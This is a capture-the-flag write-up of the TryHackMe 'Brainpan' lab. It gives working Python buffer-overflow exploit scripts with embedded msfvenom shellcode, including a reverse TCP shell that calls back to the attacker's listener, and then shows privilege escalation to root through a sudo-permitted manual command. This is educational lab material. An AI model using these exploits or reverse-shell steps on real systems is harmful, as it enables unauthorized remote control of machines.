---
title:  "Try Hack Me - Brainpan"
categories: [Binary Exploitation]
tags: [Tryhackme, Hard]
imageid: /assets/images/Brainpan/img/cover.png
published: false
---

![](/assets/images/Brainpan/img/cover.png)


## Portscan
---


```bash
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=3/1%Time=603CF657%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
```

## Reconaissance

`http://10.10.238.192:10000/`

![](img/1.png)

scanning directory will find /bin on target

`ffuf -c -u http://10.10.238.192:10000/FUZZ -w` /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![](img/2.png)

`http://10.10.238.192:10000/bin/`

![](img/3.png)

before goin to reverse the brainpan.exe im gonna tried to interact with target on port 9999

`nc $ip 9999`

![](img/4.png)

i didn't know about the password was, grab that brainpan.exe, and open it with immunity debugger. This script below tried to interact with target and i want see behaviour about the apps.

```python
#!/usr/bin/env python3

import time
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#ip windows machine
s.connect(('192.168.100.37',9999))

banner = s.recv(2048).decode()
print(banner)

s.close()

```

![](img/5.png)

now after we can interact with target, im gonna fuzzing the apps sending A over 50 bytes and increase the buffer size until the app crashed.

```python
#!/usr/bin/env python3

import time
import socket
import sys

count = 50


while True: 
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

        #ip windows machine
        s.connect(('192.168.100.37',9999))

        junk = 'A'*count

        payload = junk
        payload = payload.encode('raw_unicode_escape')

        count += 100

        s.send(payload)

        time.sleep(0.3)

        print('[-] Sending buffer size {} bytes'.format(count))
        s.close()

    except:
        print('[+] application crash on {} bytes'.format(count))
        sys.exit()
```

![](img/6.png)

```
[+] application crash on 950 bytes
```

nice, look and immunity debugger the app will crash after we send 950 bytes.

![](img/tryhackme/fuzz.png)

now we need to determining offset EIP address, im gonna generate 950 bytes and look at the EIP address that our offset.

```python
#!/usr/bin/env python3

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#ip windows machine
s.connect(('192.168.100.37',9999))

pattern = 'qeoEANdF9lQnZBf8tJ8nwSJohrsWIWIgsYxw4okaoURbmjW83GMwvZft3g4ZdsKbBwWLk8anj3o7CvIW7ULQzPmDVPQ0JbQzI4Dfm7T9lhjS5rWjtTt0PUURc2XGKPXEZJVihoZBqE9T1u59qe2kaQqjt9lSlYlfaTasAXzaGoHKsAL88KCqHMABZHg6i4W807k4UCkVEmBcJhH0k8IDU6Y1PWsZnGhPSPdX0LGVXpodwCvSbzT2avThGBwRGUD5Tvtcq0LHmxBBd3yNNlBmkCP2ctsSSsrSQ2PtCC2dKd9yHDGLUOUuS5kGnTYdfoLKjSC1180NwBBE232bMOR247BpQtgUavnMuaCXmAHrrxj9hXtALb8P23YxXqSAqrgtSU1dAg824ObHtpNJMJhXAPVMzSKsS1HBIoIkGIerjIzJgPGU6YiWwHHk4ocfoDmo5zAg2Il8Jmid2yIqbI1wWQSK70mge9wscDptuwmAHdquZXL5Ou8xricNapVKZ1q2yktFrsJ5sTyHSeKNpUEozn721dbF8QMt9dT49dWgN3H1aPHc1LPEtbsshESKUybRs8iLhBZQguaIcn7NzXCKVJXU0tJS9Gp3GCsiOGXfsV4tavlM1AiGLTNDQuQHybfJGtU0IvwezquQP7hXGBvJoebjgkuOSoNit03WhSttdcS9hlbJUhylkn5jsrsGGYQHZdMOWQZxNMrfVPxHs0pa5pXliTyQmPG4tyfMmzUiYvV2tWpy64vQwsWj9YwwyT5I7XGpdCjWJs6kC4m6AGFC7CEi5UFpnVSAZ48SM2P0iAduNtYtiWt5NupUnATejuCC0tbdmGLjo4jrPwgcrB5x9V9GAO0qnNKoSszceiFCSPRruRtr2V3uN62f7nKlY9BREUYAn8lsbqRt3UB4XptiHE5n1oUlnPAdx3JmxawR2bRUJGTBm6SrSM'

# junk = 'A'*count
payload = pattern
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
```
![](img/tryhackme/EIP.png)

as you can see that if you look on EIP address will see 'SeKN' value, our patter successfuly send it into stack

![](img/7.png)

```
EIP [*]value  524
```

after determining the offset of EIP address, im gonna tried to overwrite EIP address to B = \x42, here's script below will send  junk over 524 bytes.

```python
#!/usr/bin/env python3

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#ip windows machine
s.connect(('192.168.100.37',9999))

junk = 'A'*524
eip = 'B'*4
esp = 'C'*4

payload = junk + eip + esp
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
```

![](img/tryhackme/EIP2.png)

as you can see i able to overwrite the EIP address into B, now i already check the bad character is '\x00'.
what i've done is :

1. fuzz (yes!)
2. offset EIP (yes!)
3. badchar (\x00 yes!)

last but not least im gonna find the JMP address after that im gonna generate shellcode for execute cacl.exe, i was reading one of article if you want to test ur shellcode on windows just use calc.exe for execute, after that you can replace calc.exe into ur shellcode.

find jmp address using mona, run command bellow :

`!mona jmp -r esp -cpb ESP address`

![](img/tryhackme/jmp.png)

that our jmp address, everything is FALSE thats good click that you can see similiar below

![](img/tryhackme/jmp2.png)

now im gonna generate shellcode for windows and this shellcode will execute calc.exe

`msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00" -f c`

here's below my final exploit final

```python
#!/usr/bin/env python3

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#ip windows machine
s.connect(('192.168.100.37',9999))

#OFFSET EIP
junk = 'A'*524

#JMP ADDRESS
# 31 17 12 f3
eip = '\xF3\x12\x17\x31'

# add nop sled
esp = '\x90'*30
#shellcode here 
#msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00" f c
esp += ("\xdb\xd4\xbe\x71\x9b\x2e\x19\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x31\x83\xea\xfc\x31\x72\x14\x03\x72\x65\x79\xdb\xe5\x6d\xff"
"\x24\x16\x6d\x60\xac\xf3\x5c\xa0\xca\x70\xce\x10\x98\xd5\xe2"
"\xdb\xcc\xcd\x71\xa9\xd8\xe2\x32\x04\x3f\xcc\xc3\x35\x03\x4f"
"\x47\x44\x50\xaf\x76\x87\xa5\xae\xbf\xfa\x44\xe2\x68\x70\xfa"
"\x13\x1d\xcc\xc7\x98\x6d\xc0\x4f\x7c\x25\xe3\x7e\xd3\x3e\xba"
"\xa0\xd5\x93\xb6\xe8\xcd\xf0\xf3\xa3\x66\xc2\x88\x35\xaf\x1b"
"\x70\x99\x8e\x94\x83\xe3\xd7\x12\x7c\x96\x21\x61\x01\xa1\xf5"
"\x18\xdd\x24\xee\xba\x96\x9f\xca\x3b\x7a\x79\x98\x37\x37\x0d"
"\xc6\x5b\xc6\xc2\x7c\x67\x43\xe5\x52\xee\x17\xc2\x76\xab\xcc"
"\x6b\x2e\x11\xa2\x94\x30\xfa\x1b\x31\x3a\x16\x4f\x48\x61\x7c"
"\x8e\xde\x1f\x32\x90\xe0\x1f\x62\xf9\xd1\x94\xed\x7e\xee\x7e"
"\x4a\x70\xa4\x23\xfa\x19\x61\xb6\xbf\x47\x92\x6c\x83\x71\x11"
"\x85\x7b\x86\x09\xec\x7e\xc2\x8d\x1c\xf2\x5b\x78\x23\xa1\x5c"
"\xa9\x40\x24\xcf\x31\xa9\xc3\x77\xd3\xb5")


payload = junk + eip + esp
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
```

restart the program and execute this exploit will triggered calculator with status terminated.

`./exploit.py`

![](img/tryhackme/final.png)

as you can see i able to triggered the calculator, thats nice now we can generate our shellcode and send it into target.

`msfvenom -p linux/x86/shell/reverse_tcp LHOST=tun0 LPORT=9000 -f c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai`

![](img/8.png)

make sure start listener and execute this exploit.

final exploit :

```python
#!/usr/bin/env python3

import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#ip Target
s.connect(('10.10.10.181',9999))

#OFFSET EIP
junk = 'A'*524

#JMP ADDRESS
# 31 17 12 f3
eip = '\xF3\x12\x17\x31'

# add nop sled
esp = '\x90'*30
#shellcode here 
#msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00" f c
esp += ("\xba\x6f\x91\xde\xc1\xdb\xc9\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x1f\x31\x56\x15\x83\xee\xfc\x03\x56\x11\xe2\x9a\xfb\xd4\x9f"
"\x55\x27\x1f\xfc\xc6\x94\xb3\x69\xea\xaa\x52\xe7\x0b\x07\x1a"
"\x60\x90\xf0\x11\x86\xb4\x95\x4e\x9a\xb8\xb6\xa6\x13\x59\xd2"
"\xd0\x7b\xc9\x72\x4a\xf5\x08\x37\xb9\x85\x4f\x78\x38\x9f\x01"
"\x0d\x86\xf7\x3f\xed\xf8\x07\x67\x84\xf8\x6d\x92\xd1\x1a\x40"
"\x55\x2c\x5c\x26\xa5\xd6\xe0\xc2\x02\x9b\x1c\xac\x4c\xcb\x22"
"\xce\xc5\x08\xe3\x25\xd9\x0f\x07\xb5\x51\xf2\x05\x46\x14\xcd"
"\xee\x57\x4d\x47\xef\xc1\xc3\x73\x40\xf2\xee\xfc\x25\x35\x88"
"\xfe\xda\x57\xd0\xfe\x24\x98\x20\xba\x24\x98\x20\xbc\xeb\x18")

payload = junk + eip + esp
payload = payload.encode('raw_unicode_escape')
s.send(payload)
s.close()
```

`rlwrap nc -lnvp 9000`

![](img/9.png)

i get hit back but i cannot catch it using netcat, move on into metasploit.

![](img/10.png)

upgrade shell using python

`python -c 'import pty; pty.spawn("/bin/sh")'`

# Privilege escalation
---

run command sudo -l will show the way

`sudo -l`

![](img/11.png)

access it for see behaviour

 `sudo /home/anansi/bin/anansi_util`

![](img/12.png)

we can use manual and command, might be /bin/sh for getting shell as root.

` sudo /home/anansi/bin/anansi_util manual /bin/sh`

i just append `#!/bin/sh` on manual page and i become root

![](img/13.png)


# References
---

```
https://netsec.ws/?p=337
```